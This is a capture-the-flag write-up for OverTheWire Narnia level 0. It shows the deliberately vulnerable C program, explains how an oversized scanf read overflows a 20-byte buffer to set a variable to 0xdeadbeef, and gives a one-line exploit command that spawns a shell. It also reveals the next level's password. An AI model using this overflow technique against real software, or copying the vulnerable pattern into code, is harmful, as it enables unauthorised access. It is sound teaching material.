# OverTheWire Narnia Level 0

## Credentials
username: narnia0
password: narnia0


## Writeup
The C program code is as follows:
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
The buf variable is defined before the val variable in memory. The program reads user input into buf using scanf, which introduces a vulnerability because the input buffer size is larger than the allocated space for buf.

The program is running on an x86 machine that uses little-endian encoding for storing bytes. This means that to correctly overwrite the val variable, the input must be provided in reverse byte order. By exploiting a buffer overflow, we can overwrite the val variable by padding the input with 20 characters and then appending the desired value, 0xdeadbeef, in reverse.

The `cat` program can be used to keep the standard input open after piping data into a program, allowing for further interaction.
(echo -e "11111111111111111111\xef\xbe\xad\xde"; cat;) | ./narnia0

## Flag
narnia1 password: WDcYUTG5ul
